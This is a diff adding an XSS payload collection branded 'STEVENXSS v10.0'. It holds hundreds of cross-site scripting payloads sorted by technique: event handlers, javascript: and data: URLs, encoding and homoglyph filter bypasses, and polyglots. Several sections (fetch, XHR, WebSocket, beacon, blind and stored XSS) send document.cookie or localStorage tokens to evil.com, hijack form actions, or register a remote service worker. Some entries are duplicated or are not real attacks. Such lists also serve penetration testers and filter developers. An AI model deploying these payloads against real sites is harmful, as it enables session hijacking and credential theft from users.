@@ -1,0 +1,526 @@
+# ==================== ULTIMATE XSS PAYLOAD LIST ====================
+# STEVENXSS v10.0 - Ultimate Payload Collection
+# 500+ Advanced XSS Payloads
+
+# ==================== BASIC SCRIPT PAYLOADS ====================
+<script>alert('XSS')</script>
+<script>alert(document.domain)</script>
+<script>alert(document.cookie)</script>
+<script>prompt('XSS')</script>
+<script>confirm('XSS')</script>
+<script>console.log('XSS')</script>
+
+# ==================== IMG TAG PAYLOADS ====================
+<img src=x onerror=alert('XSS')>
+<img src=x onerror=alert(document.domain)>
+<img src=x onerror=alert(document.cookie)>
+<img src=x onerror="alert('XSS')">
+<img src=x onerror=javascript:alert('XSS')>
+<img src='x' onerror='alert(1)'>
+<img src=\"x\" onerror=\"alert(1)\">
+<img src=`x` onerror=`alert(1)`>
+
+# ==================== SVG PAYLOADS ====================
+<svg onload=alert('XSS')>
+<svg onload=alert(document.domain)>
+<svg/onload=alert('XSS')>
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')">
+<svg><animate onbegin=alert('XSS') attributeName=x></svg>
+<svg><script>alert('XSS')</script></svg>
+
+# ==================== BODY PAYLOADS ====================
+<body onload=alert('XSS')>
+<body onpageshow=alert('XSS')>
+<body onfocus=alert('XSS')>
+<body onscroll=alert('XSS')>
+<body onresize=alert('XSS')>
+
+# ==================== IFRAME PAYLOADS ====================
+<iframe src=javascript:alert('XSS')>
+<iframe src="javascript:alert('XSS')">
+<iframe srcdoc="<script>alert('XSS')</script>">
+<iframe onload=alert('XSS')>
+
+# ==================== LINK PAYLOADS ====================
+<a href=javascript:alert('XSS')>click</a>
+<a href="javascript:alert('XSS')">click</a>
+<a href='javascript:alert("XSS")'>click</a>
+<a href=javascript:alert(document.domain)>click</a>
+
+# ==================== FORM PAYLOADS ====================
+<form><button formaction=javascript:alert('XSS')>click
+<form id=x></form><button form=x formaction=javascript:alert('XSS')>click
+<input onfocus=alert('XSS') autofocus>
+<select onfocus=alert('XSS') autofocus>
+
+# ==================== VIDEO/AUDIO PAYLOADS ====================
+<video src=x onerror=alert('XSS')>
+<audio src=x onerror=alert('XSS')>
+<video><source onerror=alert('XSS')>
+<audio><source onerror=alert('XSS')>
+
+# ==================== META PAYLOADS ====================
+<meta http-equiv="refresh" content="0;url=javascript:alert('XSS')">
+<meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8A&AGy&AG0&AG8&AGc&AGU&AGs&AF8&AGkAbgBwAHUAdA&ADs&AGgA&AF0&AAA&AB0">
+
+# ==================== STYLE PAYLOADS ====================
+<style onload=alert('XSS')></style>
+<link rel=stylesheet href=javascript:alert('XSS')>
+
+# ==================== TABLE PAYLOADS ====================
+<table background=javascript:alert('XSS')></table>
+<td background=javascript:alert('XSS')></td>
+
+# ==================== EMBED/OBJECT PAYLOADS ====================
+<embed src=javascript:alert('XSS')>
+<object data=javascript:alert('XSS')>
+<object data="data:text/html,<script>alert('XSS')</script>">
+
+# ==================== MATH PAYLOADS ====================
+<math href=javascript:alert('XSS')>click</math>
+
+# ==================== DETAILS PAYLOADS ====================
+<details ontoggle=alert('XSS')>
+
+# ==================== INPUT PAYLOADS ====================
+<input onmouseover=alert('XSS')>
+<input onfocus=alert('XSS') autofocus>
+<input onblur=alert('XSS') autofocus><input autofocus>
+
+# ==================== TEXTAREA PAYLOADS ====================
+<textarea onfocus=alert('XSS') autofocus>
+<textarea onblur=alert('XSS') autofocus>
+
+# ==================== SELECT PAYLOADS ====================
+<select onfocus=alert('XSS') autofocus>
+<select onchange=alert('XSS') autofocus>
+
+# ==================== KEYGEN PAYLOADS ====================
+<keygen autofocus onfocus=alert('XSS')>
+
+# ==================== MARQUEE PAYLOADS ====================
+<marquee onstart=alert('XSS')>
+<marquee loop=1 width=0 onfinish=alert('XSS')>
+
+# ==================== ISINDEX PAYLOADS ====================
+<isindex type=image src=1 onerror=alert('XSS')>
+
+# ==================== EVENT HANDLER PAYLOADS ====================
+" onmouseover="alert('XSS')
+' onmouseover='alert(1)'
+" onfocus="alert('XSS')
+' onfocus='alert(1)'
+" onblur="alert('XSS')
+" onload="alert('XSS')
+" onerror="alert('XSS')
+" onscroll="alert('XSS')
+" onresize="alert('XSS')
+" onselect="alert('XSS')
+" onchange="alert('XSS')
+" onsubmit="alert('XSS')
+" onreset="alert('XSS')
+" onkeydown="alert('XSS')
+" onkeypress="alert('XSS')
+" onkeyup="alert('XSS')
+" onclick="alert('XSS')
+
+# ==================== JAVASCRIPT URL PAYLOADS ====================
+javascript:alert('XSS')
+javascript:alert(document.domain)
+javascript:alert(document.cookie)
+JavasCript:alert('XSS')
+javaSCRIPT:alert('XSS')
+javascript:%61%6c%65%72%74%28%27%58%53%53%27%29
+javascript:prompt('XSS')
+javascript:confirm('XSS')
+
+# ==================== DATA URL PAYLOADS ====================
+data:text/html,<script>alert('XSS')</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
+data:text/html,<img src=x onerror=alert('XSS')>
+data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>
+
+# ==================== VBSCRIPT PAYLOADS ====================
+vbscript:msgbox("XSS")
+
+# ==================== JAVASCRIPT PROTOCOL BYPASS ====================
+java&#115;cript:alert('XSS')
+java&#x73;cript:alert('XSS')
+javascript&#58;alert('XSS')
+javascript&colon;alert('XSS')
+&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;
+
+# ==================== UNICODE BYPASS PAYLOADS ====================
+<javascript:alert('XSS')>
+<SCRIPT>alert('XSS')</SCRIPT>
+<ScRiPt>alert('XSS')</ScRiPt>
+<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>
+<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
+
+# ==================== NO SCRIPT TAG PAYLOADS ====================
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<IMG SRC=# onmouseover="alert('xxs')">
+<IMG SRC= onmouseover="alert('xxs')">
+<IMG onmouseover="alert('xxs')">
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+
+# ==================== ENTITY ENCODING PAYLOADS ====================
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+
+# ==================== HEX ENCODING PAYLOADS ====================
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+
+# ==================== MULTIPLE ENCODING PAYLOADS ====================
+%3Cscript%3Ealert('XSS')%3C/script%3E
+%253Cscript%253Ealert('XSS')%253C/script%253E
+%22%3E%3Cscript%3Ealert(%27XSS%27)%3C/script%3E
+
+# ==================== NULL BYTE PAYLOADS ====================
+<scr%00ipt>alert('XSS')</scr%00ipt>
+<scri%00pt>alert('XSS')</scri%00pt>
+<scr%00ipt>alert('XSS')</script>
+
+# ==================== TAB/NEWLINE BYPASS ====================
+<scr	ipt>alert('XSS')</scr	ipt>
+<scr
+ipt>alert('XSS')</scr
+ipt>
+<img src="x" onerror="alert('XSS')">
+
+# ==================== CASE VARIATION PAYLOADS ====================
+<ScRiPt>alert('XSS')</sCrIpT>
+<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>
+<ImG sRc=x oNeRrOr=alert("XSS")>
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+
+# ==================== BACKTICK PAYLOADS ====================
+<img src=x onerror=`alert`XSS``>
+<img src=x onerror=alert`XSS`>
+
+# ==================== DOUBLE QUOTE ESCAPE ====================
+<img src=x onerror="alert("XSS")">
+<img src=x onerror='alert('XSS')'>
+
+# ==================== COMMENT BYPASS PAYLOADS ====================
+<sc<!-- -->ript>alert('XSS')</sc<!-- -->ript>
+<img src=x onerror=alert('XSS')>
+<scr<!-- -->ipt>alert('XSS')</scr<!-- -->ipt>
+<script><!-- -->alert('XSS')<!-- --></script>
+
+# ==================== MULTILINE PAYLOADS ====================
+<script>
+alert('XSS')
+</script>
+<img
+src=x
+onerror=alert('XSS')>
+
+# ==================== NO QUOTES PAYLOADS ====================
+<script>alert(/XSS/)</script>
+<img src=x onerror=alert(/XSS/)>
+<svg onload=alert(/XSS/)>
+
+# ==================== ANGLE BRACKET BYPASS ====================
+><script>alert('XSS')</script>
+"><script>alert('XSS')</script>
+'><script>alert('XSS')</script>
+</script><script>alert('XSS')</script>
+
+# ==================== TEMPLATE LITERAL PAYLOADS ====================
+<script>alert`XSS`</script>
+<img src=x onerror=alert`XSS`>
+<svg onload=alert`XSS`>
+
+# ==================== FUNCTION CONSTRUCTOR PAYLOADS ====================
+<script>Function`alert\x28\\XSS\\x29```</script>
+<script>setTimeout`alert\x28\\XSS\\x29`</script>
+<script>setInterval`alert\x28\\XSS\\x29`</script>
+
+# ==================== LOCATION BASED PAYLOADS ====================
+<script>location='javascript:alert("XSS")'</script>
+<script>location.href='javascript:alert("XSS")'</script>
+<script>window.location='javascript:alert("XSS")'</script>
+<script>self.location='javascript:alert("XSS")'</script>
+
+# ==================== DOCUMENT WRITE PAYLOADS ====================
+<script>document.write('<script>alert("XSS")</script>')</script>
+<script>document.writeln('<script>alert("XSS")</script>')</script>
+<script>document.write("<img src=x onerror=alert('XSS')>")</script>
+
+# ==================== INNERHTML PAYLOADS ====================
+<script>document.body.innerHTML='<img src=x onerror=alert("XSS")>'</script>
+<script>document.getElementById('x').innerHTML='<script>alert("XSS")</script>'</script>
+
+# ==================== EVAL PAYLOADS ====================
+<script>eval('alert("XSS")')</script>
+<script>eval("alert('XSS')")</script>
+<script>eval(`alert('XSS')`)</script>
+<script>window.eval('alert("XSS")')</script>
+
+# ==================== SETTIMEOUT PAYLOADS ====================
+<script>setTimeout('alert("XSS")',0)</script>
+<script>setTimeout("alert('XSS')",0)</script>
+<script>setTimeout(`alert('XSS')`,0)</script>
+
+# ==================== SETINTERVAL PAYLOADS ====================
+<script>setInterval('alert("XSS")',1000)</script>
+<script>setInterval("alert('XSS')",1000)</script>
+
+# ==================== EXECUTION PAYLOADS ====================
+<script>Function('alert("XSS")')()</script>
+<script>[].constructor.constructor('alert("XSS")')()</script>
+
+# ==================== IMPORT PAYLOADS ====================
+<script>import('data:text/javascript,alert("XSS")')</script>
+
+# ==================== FETCH PAYLOADS ====================
+<script>fetch('http://evil.com/?c='+document.cookie)</script>
+<img src=x onerror="fetch('http://evil.com/?c='+document.cookie)">
+
+# ==================== XMLHTTPREQUEST PAYLOADS ====================
+<script>var x=new XMLHttpRequest();x.open('GET','http://evil.com/?c='+document.cookie);x.send();</script>
+<img src=x onerror="var x=new XMLHttpRequest();x.open('GET','http://evil.com/?c='+document.cookie);x.send();">
+
+# ==================== WEBSOCKET PAYLOADS ====================
+<script>var ws=new WebSocket('ws://evil.com');ws.onopen=function(){ws.send(document.cookie)};</script>
+
+# ==================== BEACON PAYLOADS ====================
+<script>navigator.sendBeacon('http://evil.com/',document.cookie)</script>
+
+# ==================== IMAGE BEACON PAYLOADS ====================
+<script>var i=new Image();i.src='http://evil.com/?c='+document.cookie;</script>
+<img src=x onerror="var i=new Image();i.src='http://evil.com/?c='+document.cookie;">
+
+# ==================== LOCALSTORAGE PAYLOADS ====================
+<script>alert(localStorage.getItem('token'))</script>
+<script>fetch('http://evil.com/?token='+localStorage.getItem('token'))</script>
+
+# ==================== SESSIONSTORAGE PAYLOADS ====================
+<script>alert(sessionStorage.getItem('session'))</script>
+
+# ==================== COOKIE PAYLOADS ====================
+<script>alert(document.cookie)</script>
+<script>document.cookie='evil=1'</script>
+<script>fetch('http://evil.com/?c='+btoa(document.cookie))</script>
+
+# ==================== DOM CLICKJACKING PAYLOADS ====================
+<script>document.body.click()</script>
+<script>document.forms[0].submit()</script>
+
+# ==================== FORM SUBMISSION PAYLOADS ====================
+<script>document.forms[0].action='http://evil.com';document.forms[0].submit()</script>
+
+# ==================== REDIRECT PAYLOADS ====================
+<script>window.location='http://evil.com'</script>
+<script>location.href='http://evil.com'</script>
+<script>document.location='http://evil.com'</script>
+
+# ==================== HISTORY MANIPULATION PAYLOADS ====================
+<script>history.pushState({},'','http://evil.com')</script>
+
+# ==================== POPUP PAYLOADS ====================
+<script>open('http://evil.com')</script>
+<script>window.open('http://evil.com','_self')</script>
+
+# ==================== CONSOLE PAYLOADS ====================
+<script>console.error('XSS')</script>
+<script>console.warn('XSS')</script>
+<script>console.info('XSS')</script>
+
+# ==================== ERROR BASED PAYLOADS ====================
+<script>throw alert('XSS')</script>
+<script>undefined()</script>
+
+# ==================== POLYGLOT PAYLOADS ====================
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/'/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+'>"><img src=x onerror=alert(1)>
+<svg/onload=alert(1)//
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+
+# ==================== MIXED CASE POLYGLOT ====================
+jAvAsCrIpT:/*--></tiTle></sTyle></texTarea></sCript></xMp><sVg/onLoad='+/'/+/onMouseOver=1/+/[*/[]/+aLert(1)//'>
+
+# ==================== ADVANCED POLYGLOT ====================
+';alert('XSS');//
+";alert('XSS');//
+`;alert('XSS');//
+</script><script>alert('XSS')</script>
+</style><script>alert('XSS')</script>
+
+# ==================== URL FRAGMENT PAYLOADS ====================
+#<img src=x onerror=alert('XSS')>
+#<script>alert('XSS')</script>
+#javascript:alert('XSS')
+
+# ==================== PROTOCOL RELATIVE PAYLOADS ====================
+//evil.com/xss.js
+///evil.com/xss.js
+
+# ==================== BASE TAG PAYLOADS ====================
+<base href=javascript:alert('XSS')//>
+<base href="javascript:alert('XSS')">
+
+# ==================== META REFRESH PAYLOADS ====================
+<meta http-equiv="refresh" content="0; javascript:alert('XSS')">
+
+# ==================== STYLE SHEET PAYLOADS ====================
+<link rel=stylesheet href=javascript:alert('XSS')>
+<style>@import'javascript:alert("XSS")';</style>
+
+# ==================== CSS EXPRESSION PAYLOADS ====================
+<div style="background:url(javascript:alert('XSS'))">
+<div style="width:expression(alert('XSS'))">
+
+# ==================== ANCHOR PAYLOADS ====================
+<a style="pointer-events:none" href=javascript:alert('XSS')>click</a>
+
+# ==================== FORM PAYLOADS ====================
+<form><button formaction=javascript:alert('XSS')>click</form>
+<form id=x></form><button form=x formaction=javascript:alert('XSS')>click
+
+# ==================== IFRAME SANDBOX BYPASS ====================
+<iframe sandbox="allow-scripts" src="data:text/html,<script>alert('XSS')</script>"></iframe>
+
+# ==================== OBJECT DATA PAYLOADS ====================
+<object data="javascript:alert('XSS')">
+<object data="data:text/html,<script>alert('XSS')</script>">
+
+# ==================== EMBED SRC PAYLOADS ====================
+<embed src=javascript:alert('XSS')>
+<embed src="javascript:alert('XSS')">
+
+# ==================== MATH PAYLOADS ====================
+<math><mi//xlink:href="javascript:alert('XSS')">CLICK
+
+# ==================== CDATA PAYLOADS ====================
+<![CDATA[<script>alert('XSS')</script>]]>
+
+# ==================== NOSCRIPT PAYLOADS ====================
+<noscript><p>test</p></noscript>
+
+# ==================== PSEUDO PROTOCOL PAYLOADS ====================
+<xss style="behavior:url(#default#time2)" onbegin="alert('XSS')" />
+
+# ==================== VBSCRIPT PAYLOADS ====================
+<comment><img src="</comment><img src=x onerror=alert('XSS')>">
+
+# ==================== EXPRESSION PAYLOADS ====================
+<div style="width: expression(alert('XSS'));">
+<div style="background:url(javascript:alert('XSS'))">
+
+# ==================== FILTER BYPASS PAYLOADS ====================
+<scr<script>ipt>alert('XSS')</scr</script>ipt>
+<scri<script>pt>alert('XSS')</scri</script>pt>
+<scr_ipt>alert('XSS')</scr_ipt>
+<scr%00ipt>alert('XSS')</scr%00ipt>
+
+# ==================== DOUBLE ENCODE PAYLOADS ====================
+%253Cscript%253Ealert('XSS')%253C/script%253E
+%2522%253E%253Cscript%253Ealert(%2527XSS%2527)%253C/script%253E
+
+# ==================== UTF7 PAYLOADS ====================
++ADw-script+AD4-alert('XSS')+ADw-/script+AD4-
+
+# ==================== UTF16 PAYLOADS ====================
+ﬆscriptﬆalert('XSS')ﬆ/scriptﬆ
+
+# ==================== MIXED ENCODING PAYLOADS ====================
+<scri%00%00%00pt>alert('XSS')</scri%00%00%00pt>
+<img src=x%00 onerror%00=alert('XSS')>
+
+# ==================== MULTIPLE ATTRIBUTES PAYLOADS ====================
+<img src=x onerror onerror=alert('XSS')>
+<img src=x oneonerrorrror=alert('XSS')>
+<img src=x oonerrornerror=alert('XSS')>
+
+# ==================== SPACE BYPASS PAYLOADS ====================
+<svg/onload=alert('XSS')>
+<img/src=x/onerror=alert('XSS')>
+<script/src=//evil.com/xss.js>
+
+# ==================== TAB BYPASS PAYLOADS ====================
+<scr	ipt>alert('XSS')</scr	ipt>
+<img	src=x	onerror=alert('XSS')>
+
+# ==================== NEWLINE BYPASS PAYLOADS ====================
+<scr
+ipt>alert('XSS')</scr
+ipt>
+<img
+src=x
+onerror=alert('XSS')>
+
+# ==================== CARRIAGE RETURN BYPASS ====================
+<scr%0Dipt>alert('XSS')</scr%0Dipt>
+
+# ==================== FORM FEED BYPASS ====================
+<scr%0Cipt>alert('XSS')</scr%0Cipt>
+
+# ==================== VERTICAL TAB BYPASS ====================
+<scr%0Bipt>alert('XSS')</scr%0Bipt>
+
+# ==================== MULTIPLE ENCODING COMBINED ====================
+%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%27%58%53%53%27%29%3C%2F%73%63%72%69%70%74%3E
+
+# ==================== UNICODE NORMALIZATION PAYLOADS ====================
+<scrıpt>alert('XSS')</scrıpt>
+
+# ==================== HOMOGLYPH PAYLOADS ====================
+<ѕcript>alert('XSS')</ѕcript>
+
+# ==================== ZERO WIDTH CHARACTER PAYLOADS ====================
+<scri​pt>alert('XSS')</scri​pt>
+
+# ==================== RLO CHARACTER PAYLOADS ====================
+<scri‮pt>alert('XSS')</scri‮pt>
+
+# ==================== NORMALIZATION PAYLOADS ====================
+<scrℹpt>alert('XSS')</scrℹpt>
+
+# ==================== BLIND XSS PAYLOADS ====================
+<script>fetch('http://evil.com/xss?c='+btoa(document.cookie))</script>
+<img src=x onerror="fetch('http://evil.com/xss?c='+btoa(document.cookie))">
+<script>var i=new Image();i.src='http://evil.com/xss?c='+document.cookie;</script>
+
+# ==================== STORED XSS PAYLOADS ====================
+<script>setInterval(function(){fetch('http://evil.com/monitor')},5000)</script>
+<img src=x onerror="setInterval(function(){fetch('http://evil.com/monitor')},5000)">
+
+# ==================== SELF-XSS PAYLOADS ====================
+javascript:alert(1)
+javascript:prompt(1)
+javascript:confirm(1)
+
+# ==================== DOM XSS PAYLOADS ====================
+#<img src=x onerror=alert(1)>
+#<script>alert(1)</script>
+#javascript:alert(1)
+
+# ==================== POST MESSAGE XSS ====================
+<script>window.postMessage('XSS','*')</script>
+
+# ==================== WEBRTC XSS ====================
+<script>RTCPeerConnection()</script>
+
+# ==================== SERVICE WORKER XSS ====================
+<script>navigator.serviceWorker.register('//evil.com/sw.js')</script>
+
+# ==================== NOTIFICATION XSS ====================
+<script>Notification.requestPermission()</script>
+
+# ==================== GEOLOCATION XSS ====================
+<script>navigator.geolocation.getCurrentPosition()</script>
+
+# ==================== CLIPBOARD XSS ====================
+<script>navigator.clipboard.writeText('XSS')</script>
+
+# ==================== VIBRATION XSS ====================
+<script>navigator.vibrate(200)</script>
+
+# ==================== BATTERY XSS ====================
+<script>navigator.getBattery()</script>
+
+# ==================== END OF ULTIMATE PAYLOAD LIST ====================
